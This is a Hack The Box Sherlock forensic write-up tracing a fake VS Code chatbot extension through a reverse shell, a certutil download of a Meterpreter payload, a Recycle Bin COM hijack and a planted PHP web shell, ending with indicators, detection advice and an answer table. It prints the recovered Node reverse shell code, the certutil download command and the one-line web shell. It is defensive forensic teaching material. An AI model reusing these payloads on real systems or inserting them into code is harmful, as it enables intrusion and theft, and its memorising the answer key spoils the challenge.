# HTB Sherlock: ReliableThreat, Full Writeup

**Category:** DFIR / Supply Chain Compromise and Persistence Forensics | **Platform:** Hack The Box (Sherlock) | **Difficulty:** Medium | **Solved:** 13 September 2026

---

## TL;DR

A company's source code leaked. An employee is the prime suspect but flatly denies downloading any external program, and the denial turns out to be technically sincere. They never downloaded a program in the sense they meant it, they installed a VS Code extension from the official Microsoft Marketplace. That distinction, extension versus program, is exactly the gap the attacker exploited, both to get past the victim's own judgment and later to survive a straightforward investigation.

This is a supply chain compromise rather than a phishing case, the attacker published a fake AI chatbot extension to a trusted distribution channel and waited for someone to install it voluntarily. From there the case runs the full intrusion lifecycle, execution hidden inside a genuinely working feature, a throwaway reverse shell, a second stage implant masquerading as a Windows system process, a download flagged but not blocked by Defender, a persistence mechanism that survived hours of live registry searching before being found in a dropped tool's own compiled strings, and a one line backdoor planted directly in the stolen codebase.

---

## Scenario

> We have discovered a serious security breach involving the unauthorized exposure of our source code. An employee has been identified as a potential suspect in this incident. However, the employee strongly denies any involvement or downloading of external programs. We seek your expertise in digital forensic investigation to perform a comprehensive analysis, determine the root cause of the leak, and help us resolve the situation effectively.

---

## Methodology and Tooling

Two evidence sources this time, and one that came with a deliberate gap. The disk image was a custom content image, hand selected paths rather than a full disk, containing only the Public folder and the user's Desktop and Downloads, no Windows system tree at all. That meant no Prefetch and no on disk registry hives, every registry question in this room had to be answered from the live memory image instead.

```
vol -r csv -f memdump.dmp windows.pstree  > pstree.csv
vol -r csv -f memdump.dmp windows.cmdline > cmdline.csv
vol -f memdump.dmp windows.filescan       > filescan.txt
vol -f memdump.dmp windows.dumpfiles --virtaddr <offset>
vol -f memdump.dmp windows.getsids --pid <pid>
vol -f memdump.dmp windows.registry.printkey --key '<path>' --recurse
```

Worth confirming what an evidence bundle actually contains before planning an approach around it. Assuming Prefetch would be there because it usually is would have wasted real time here.

---

## Investigation, Every Task

### The Delivery Mechanism

`windows.pstree` showed `Code.exe`, signed Microsoft software in a normal install path, spawning `cmd.exe` with the flags `/d /s /c`, the signature of Node's `child_process.exec()` firing a command programmatically rather than a human opening a terminal. VS Code extensions run as Node code inside the editor process, so something inside the editor, not the editor itself, was acting.

`windows.filescan` filtered to `.vscode\extensions` surfaced a fake ChatGPT helper extension, `0xs1rx58d3v.chatgpt-b0t-0.0.1`, installed straight from the official Marketplace (confirmed via `package.json`'s VS Code authored metadata, `"source": "gallery"`). The extracted `extension.js` is a genuinely functional chatbot, answering plausible questions about JavaScript, Python, and algorithms. Buried inside the branch that handles the word `help`, and only that branch, is an obfuscated payload. The user sees a normal, helpful response and has no reason to suspect anything happened.

**Answers:** Code.exe, extracted from `.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js`, triggered by typing `help`

### Cracking the Payload

The hidden branch had been run through obfuscator.io, the standard string array, rotation, and arithmetic constant transform. Deobfuscated with `webcrack` and cross checked by hand extracting just the decoder functions:

```js
const lockFilePath = path.join(os.homedir(), '.' + pid + '.lock');
if (!fs.existsSync(lockFilePath)) {
    fs.writeFile(lockFilePath, '', e => { if (e) console.error(e); });
    const socket = new net.Socket();
    socket.connect(16587, '6.tcp.eu.ngrok.io');
    socket.on('data', d => {
        require('child_process').exec(d.toString(), (err, stdout, stderr) => {
            err ? socket.write(stderr) : socket.write(stdout);
        });
    });
}
```

A textbook Node reverse shell. Two of its strings were deliberately split across the obfuscated array and only rejoined at the call site, `'child_proc' + 'ess'`, `'6.tcp.eu.n' + 'grok.io'`, meaning a raw strings and grep sweep of memory for the hostname would have returned nothing. That's an anti grep trick, not an accident, and worth remembering, a negative grep result is never proof something isn't there.

**Answer:** reverse shell to 6.tcp.eu.ngrok.io:16587

### Publisher Identity and Release Timing

`package.json`'s editor authored metadata carried both the publisher ID and a separate human facing display name, `0xS1rx58.D3V`. The extension had already been pulled from the Marketplace by the time this needed answering, so the listing's URL was reconstructed from that same metadata and pulled from the Wayback Machine instead, which indexes by URL only, not by keyword.

The rendered archived page displayed a release time in the browser's local timezone, using it directly would have been off by both the hour and the date. Pulling the raw archived HTML (appending `id_` after the snapshot timestamp) surfaced the actual stored value, `Tue, 23 Jul 2024 00:41:19 GMT`.

**Answers:** 0xS1rx58.D3V, released 2024-07-23 00:41:19 UTC

### The Second Stage and a Masquerading Trick

`windows.getsids` on the editor process's token showed Medium Mandatory Level despite the account being a local admin, group membership is not elevation, and that single fact shaped the rest of the investigation.

Windows Defender's own detection log, recovered from memory, named the next step directly, `certutil.exe -urlcache -f https://978c93e053496c.lhr.life/Run1.exe C:\Users\Public\RuntimeBroker.exe`. Certutil doubling as a file downloader is a classic LOLBin move, no PowerShell required from a signed Microsoft binary, and `lhr.life` is a tunneling service, same pattern as the ngrok endpoint from stage one. Defender flagged the payload as `Trojan:Win64/Meterpreter!pz` and detected it without blocking it, it still executed four minutes later.

Four legitimate `RuntimeBroker.exe` instances also existed in the same memory image, System32, parented by svchost, the real DCOM activation pattern. Same name, same looking process, completely different path and parentage, the masquerading trick working exactly as intended against a casual glance.

**Answer:** C:\Users\Public\RuntimeBroker.exe

### Persistence, the Hard One

Hours were spent ruling out every standard registry persistence location reachable without elevation, Run and RunOnce keys, Image File Execution Options, AppInit DLLs, SilentProcessExit, COM and CLSID hijacking in the user's class hive, file association hijacking, Winlogon, App Paths, the COR_PROFILER dotnet profiler trick, and Command Processor AutoRun. Every single one came back clean. A structural check confirmed why, the actual malicious RuntimeBroker process, verified by cross referencing its full path rather than trusting a name alone, was still Medium integrity. It never escalated at any point, which meant every technique requiring elevation was genuinely impossible here, not just unfound.

What broke it open was a second look at the disk image, captured separately from and evidently later than the memory dump, which turned up a file memory search had never surfaced, `C:\Users\Public\temp.exe`. Its imports, `RegCreateKeyExA` and `RegSetValueExA`, confirmed it as a registry writer, and its compiled strings contained the answer directly, `SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell`, the Recycle Bin's CLSID.

Writing a shell open command value under that CLSID hijacks what fires when a user double clicks the Recycle Bin icon, entirely from the current user's own registry hive, no elevation needed, and about as legitimate a component as persistence gets. The earlier live registry check of this exact CLSID had come back empty, correctly, because the tool that writes it hadn't been dropped yet at whatever moment the memory image was captured. A well reasoned live state search that comes back clean proves the technique's effects aren't visible in that particular snapshot, not that the technique wasn't used. The dropped tool outlived the moment it fired and told the story through its own imports and strings.

**Answers:** Recycle Bin, MITRE T1546.015 (Component Object Model Hijacking)

### The Actual Backdoor

The stolen project directory contained five folders, and a staged copy of the same tree sitting in a ZIP in the Public folder confirmed the exfiltration target. Every file at the project root showed access times clustered in the intrusion window but modification times predating it, except the repository's own `.git` folder, whose modified timestamp landed inside the intrusion window, directory mtimes bump when their contents change, a signal something had changed somewhere inside.

Checking the two classic injection points for this framework, both execute on nearly every request, the routes file was clean but the single front controller carried a modification timestamp thirty three seconds before the persistence tool was dropped, same operator session. The injected line:

```php
$testc = $_GET['s1']; echo `$testc`;
```

A one line, unauthenticated web shell. PHP's backtick operator executes a string as an OS command, functionally identical to shell_exec but not a named function call, so a grep for the usual suspects misses it entirely. Any request to the front controller with that parameter gets arbitrary remote code execution on whatever server this code ships to next.

**Answer:** $testc = $_GET['s1']; echo `$testc`;

---

## The Full Story

An attacker publishes a fake AI chatbot extension to the official VS Code Marketplace and waits. A developer installs it, uses it normally, and eventually types "help", the one input that triggers a hidden reverse shell. Through that shell the operator downloads a Meterpreter payload disguised as a Windows system process via a signed certutil binary, a download Defender flags but doesn't stop. That implant opens a second, persistent channel, and within minutes the operator is hands on keyboard, still never escalating past a standard user token. They stage the victim's entire project directory for exfiltration, install COM hijack persistence on the Recycle Bin so access survives beyond any single shell, and plant a permanent one line backdoor directly in the stolen code's own production entry point before leaving.

---

## Indicators of Compromise

| Type | Value | Notes |
|---|---|---|
| Malicious extension | 0xs1rx58d3v.chatgpt-b0t-0.0.1, publisher 0xS1rx58.D3V | Official Marketplace, pulled after report |
| Stage one C2 | 6.tcp.eu.ngrok.io:16587 | Embedded in the extension's obfuscated payload |
| Stage two dropper URL | https://978c93e053496c.lhr.life/Run1.exe | Pulled via certutil LOLBin download |
| Masquerading implant | C:\Users\Public\RuntimeBroker.exe | Meterpreter, Defender detected as Trojan:Win64/Meterpreter!pz |
| Persistence tool | C:\Users\Public\temp.exe | Public malware family "tedy", writes COM hijack |
| Persistence mechanism | HKCU\Software\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell | Recycle Bin CLSID hijack, T1546.015 |
| Exfil staging | C:\Users\Public\filex221.zip | Full copy of the victim's project directory |
| Planted backdoor | public/index.php, $_GET['s1'] backtick execution | Unauthenticated RCE in the production entry point |

---

## Key Takeaways

- A denial can be technically true and still wrong. Supply chain compromise exploits exactly the gap between how a user categorizes risk and what actually carries it.
- Split strings defeat naive memory searches. A negative grep result is never proof something isn't there.
- Group membership is not elevation, verify integrity level directly and on the correct process when duplicate named processes exist.
- A live state search that comes back clean can still be the right search executed at the wrong moment. Cross referencing evidence sources captured at different points in time is how that gap gets caught.
- Persistence doesn't have to touch a well known Run key. Hijacking a shell object nobody suspects is real tradecraft, not a novelty, precisely because it rides on something the user interacts with constantly without thinking.
- Detection is not prevention. Defender named both the download and the payload correctly and still let both execute.

---

## Detection Opportunities

- Treat VS Code (and any editor with an extension marketplace) as a delivery vector worth monitoring, not just a developer tool, especially child processes it spawns that don't match its normal language server and build tool behavior.
- Baseline HKCU Software Classes CLSID entries for well known system object GUIDs, Recycle Bin, My Computer, Control Panel. These should almost never carry custom shell open command overrides on a normal endpoint.
- Alert on certutil, or any signed system binary, making outbound HTTP requests, it has no legitimate reason to.
- Don't stop at a name match for system process masquerading, validate path and parent process together, a same named process in a user writable folder with the wrong parent is the actual tell.
- Widen web shell content searches beyond named functions like eval and system to catch operator based execution like PHP backticks.

---

## Quick Answer Reference

| # | Task | Answer |
|---|---|---|
| 1 | App starting the suspicious chain | Code.exe |
| 2 | Full path of malicious file | C:\Users\User2\.vscode\extensions\0xs1rx58d3v.chatgpt-b0t-0.0.1\extension.js |
| 3 | User input triggering the malicious code | help |
| 4 | Reverse shell host and port | 6.tcp.eu.ngrok.io:16587 |
| 5 | Developer display name | 0xS1rx58.D3V |
| 6 | Malicious file release time (UTC) | 2024-07-23 00:41:19 |
| 7 | Compromised user's SID | S-1-5-21-1998887770-13753423-1649717590-1001 |
| 8 | Suspicious executable's full path | C:\Users\Public\RuntimeBroker.exe |
| 9 | Legitimate component hijacked | Recycle Bin |
| 10 | MITRE technique | T1546.015 |
| 11 | Injected malicious code | $testc = $_GET['s1']; echo `$testc`; |
